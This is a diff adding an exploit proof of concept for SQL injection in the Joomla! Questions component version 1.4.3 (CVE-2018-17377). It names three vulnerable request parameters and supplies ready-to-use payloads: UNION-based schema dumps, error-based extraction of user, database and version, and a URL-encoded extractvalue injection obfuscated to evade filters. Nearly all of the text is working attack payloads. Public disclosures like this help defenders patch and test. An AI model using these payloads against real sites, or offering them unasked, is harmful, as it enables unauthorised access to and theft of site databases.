@@ -1,0 +1,36 @@
+# # # # #
+# Exploit Title: Joomla! Component Questions 1.4.3 - SQL Injection
+# Dork: N/A
+# Date: 2018-09-24
+# Vendor Homepage: https://extensiondeveloper.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/communication/question-a-answers/questions/
+# Version: 1.4.3
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-17377
+# # # # #
+# Exploit Author: Ihsan Sencan
+# # # # #
+# POC: 
+# 
+# 1)
+# http://localhost/[PATH]/index.php?option=com_questions&tmpl=component&task=quazax.getusers&term=[SQL]
+# 
+# 66' UNION ALL SELECT NULL,NULL,CONCAT((SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x))--+-
+# 
+# 66' UNION ALL SELECT NULL,NULL,CONCAT(replace(replace(replace(0x232425,0x23,@:=replace(replace(replace(replace(0x243c62723e253c62723e,0x24,0x3c62723e3c62723e20494853414e2053454e43414e203c666f6e7420636f6c6f723d7265643e),0x25,version()),0x26,database()),0x27,user())),0x24,(select+count(*)+from+information_schema.columns+where+table_schema=database()+and@:=replace(replace(0x003c62723e2a,0x00,@),0x2a,table_name))),0x25,@))--+-
+# 
+# 66' AND (SELECT 8948 FROM(SELECT COUNT(*),CONCAT(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(SELECT (ELT(8948=8948,1))),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Efe
+# 
+# 2)
+# http://localhost/[PATH]/index.php?option=com_questions&tmpl=component&task=quazax.sendnotification&userid=[SQL]&users=[SQL]&groups=[SQL]
+# 
+# 
+# 66 OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),(SELECT (ELT(1=1,1))),0x7e7e496873616e53656e63616e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+# 
+# 3)
+# http://localhost/[PATH]/index.php?option=com_questions&tmpl=component&task=quazax.addnewgroup&group_name=[SQL]
+# 
+# %27%20%2f%2a%21%35%30%30%30%30%50%72%6f%63%65%64%75%72%65%2a%2f%20%2f%2a%21%35%30%30%30%30%41%6e%61%6c%79%73%65%2a%2f%20%28%65%78%74%72%61%63%74%76%61%6c%75%65%28%30%2c%2f%2a%21%35%30%30%30%30%63%6f%6e%63%61%74%2a%2f%28%30%78%32%37%2c%30%78%34%39%36%38%37%33%36%31%36%65%32%30%35%33%36%35%36%65%36%33%36%31%36%65%2c%30%78%33%61%2c%40%40%76%65%72%73%69%6f%6e%29%29%2c%30%29%2d%2d%20%2d
+# 
+# # # #
